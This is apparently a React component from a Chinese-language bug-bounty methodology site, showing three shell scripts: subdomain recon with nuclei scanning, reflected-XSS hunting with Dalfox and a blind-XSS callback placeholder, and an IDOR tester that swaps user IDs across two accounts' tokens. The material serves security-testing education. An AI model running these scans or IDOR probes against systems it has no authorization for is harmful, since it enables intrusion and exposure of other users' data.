// app/methodology/components/AutomationScripts.tsx
'use client';

// 把脚本内容单独定义为常量，完全避免模板字符串问题
const RECON_SCRIPT = `#!/bin/bash
# Automated Recon Pipeline
TARGET=$1
OUTPUT_DIR="recon_$TARGET"
mkdir -p $OUTPUT_DIR

echo "[*] Starting subdomain enumeration..."
subfinder -d $TARGET -all -o $OUTPUT_DIR/subfinder.txt
amass enum -passive -d $TARGET -o $OUTPUT_DIR/amass.txt
findomain -t $TARGET -u $OUTPUT_DIR/findomain.txt

cat $OUTPUT_DIR/*.txt | sort -u > $OUTPUT_DIR/all_subs.txt
echo "[+] Found $(wc -l < $OUTPUT_DIR/all_subs.txt) unique subdomains"

echo "[*] Resolving and checking live hosts..."
cat $OUTPUT_DIR/all_subs.txt | httpx -silent -status-code -title -o $OUTPUT_DIR/live.txt

echo "[*] Collecting URLs..."
cat $OUTPUT_DIR/live.txt | awk '{print $1}' | gau --subs | sort -u > $OUTPUT_DIR/urls.txt
cat $OUTPUT_DIR/live.txt | awk '{print $1}' | waybackurls | sort -u >> $OUTPUT_DIR/urls.txt

echo "[*] Running nuclei scan..."
nuclei -l $OUTPUT_DIR/live.txt -t cves/ -t exposures/ -o $OUTPUT_DIR/nuclei.txt

echo "[+] Recon complete! Results in $OUTPUT_DIR/"`;

const XSS_SCRIPT = `#!/bin/bash
# XSS Hunting Pipeline
TARGET=$1

echo "[*] Collecting parameterized URLs..."
echo $TARGET | gau | grep "=" | sort -u > params.txt
echo $TARGET | waybackurls | grep "=" | sort -u >> params.txt
sort -u params.txt -o params.txt

echo "[*] Testing for reflected values..."
cat params.txt | qsreplace "REFLECTED_TEST" | httpx -silent -match-string "REFLECTED_TEST" > reflected.txt

echo "[*] Running Dalfox..."
cat reflected.txt | dalfox pipe -b YOUR_XSS_HUNTER -o xss_results.txt

echo "[+] Found $(wc -l < xss_results.txt) potential XSS!"`;

const IDOR_SCRIPT = `#!/bin/bash
# IDOR Testing Script
API_BASE="https://api.target.com"
TOKEN_A="Bearer USER_A_TOKEN"
TOKEN_B="Bearer USER_B_TOKEN"

USER_A_ID="12345"
USER_B_ID="67890"

ENDPOINTS=(
  "/api/v1/users/USER_ID/profile"
  "/api/v1/users/USER_ID/orders"
  "/api/v1/users/USER_ID/settings"
  "/api/v1/users/USER_ID/documents"
)

# 注意：下方的 \${...} 已被转义，防止 TS 报错
for endpoint in "\${ENDPOINTS[@]}"; do
  url_a="\${API_BASE}\${endpoint//USER_ID/$USER_A_ID}"
  url_b="\${API_BASE}\${endpoint//USER_ID/$USER_B_ID}" 
  
  echo "[*] Testing: $endpoint"
  
  status_a=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: $TOKEN_A" "$url_a")
  status_b=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: $TOKEN_B" "$url_b")
  
  if [ "$status_b" == "200" ]; then
    echo "[!] IDOR FOUND: $endpoint"
  fi
done`;

export default function AutomationScripts() {
  return (
    <section>
      <div className="text-center mb-10">
        <h3 className="text-xl md:text-2xl font-bold mb-2">自动化脚本</h3>
        <p className="text-[#666] max-w-2xl mx-auto">
          自动化处理重复性任务可以节省大量时间并减少错误。使用这些脚本作为起点，根据你的需求进行定制。
        </p>
      </div>

      <div className="space-y-8">
        <SimpleScriptCard
          title="Recon自动化流水线"
          desc="完整的自动化信息收集流程，从子域名枚举到初步漏洞扫描"
          steps={[
            "subfinder + amass + findomain → all_subs.txt",
            "puredns 解析 → resolved.txt",
            "httpx 检测存活主机",
            "katana + gau + waybackurls 收集URL",
            "nuclei 初步漏洞扫描"
          ]}
          script={RECON_SCRIPT}
        />

        <SimpleScriptCard
          title="XSS挖掘流水线"
          desc="在所有发现的参数上自动化搜索XSS漏洞"
          steps={[
            "从gau和waybackurls收集带参数的URL",
            "过滤出反射型参数",
            "使用Dalfox测试XSS",
            "手动验证结果"
          ]}
          script={XSS_SCRIPT}
        />

        <SimpleScriptCard
          title="IDOR测试流水线"
          desc="使用两个不同账号自动化测试API接口的IDOR漏洞"
          steps={[
            "使用两个不同账号登录",
            "收集使用资源ID的API接口",
            "替换ID并测试交叉访问",
            "分析响应以验证未授权访问"
          ]}
          script={IDOR_SCRIPT}
        />
      </div>
    </section>
  );
}

function SimpleScriptCard({ title, desc, steps, script }: { 
  title: string; 
  desc: string; 
  steps: string[]; 
  script: string; 
}) {
  return (
    <div className="bg-white rounded-lg border border-[#e5e5e5] p-6">
      <div className="mb-6">
        <h4 className="text-xl font-bold mb-2">{title}</h4>
        <p className="text-[#666]">{desc}</p>
      </div>

      <div className="grid md:grid-cols-2 gap-6">
        <div>
          <h5 className="text-sm font-bold mb-3">执行步骤</h5>
          <ol className="space-y-2">
            {steps.map((step, i) => (
              <li key={i} className="text-sm text-[#666] flex items-start gap-2">
                <span className="text-[#9FEF00] mt-0.5 flex-shrink-0 font-bold">{i + 1}</span>
                {step}
              </li>
            ))}
          </ol>
        </div>

        <div>
          <h5 className="text-sm font-bold mb-2">Shell脚本</h5>
          <div className="bg-[#1a1a1a] rounded-lg p-4 overflow-x-auto">
            <pre className="text-[#9FEF00] text-xs whitespace-pre-wrap break-all">
              {script}
            </pre>
          </div>
        </div>
      </div>
    </div>
  );
}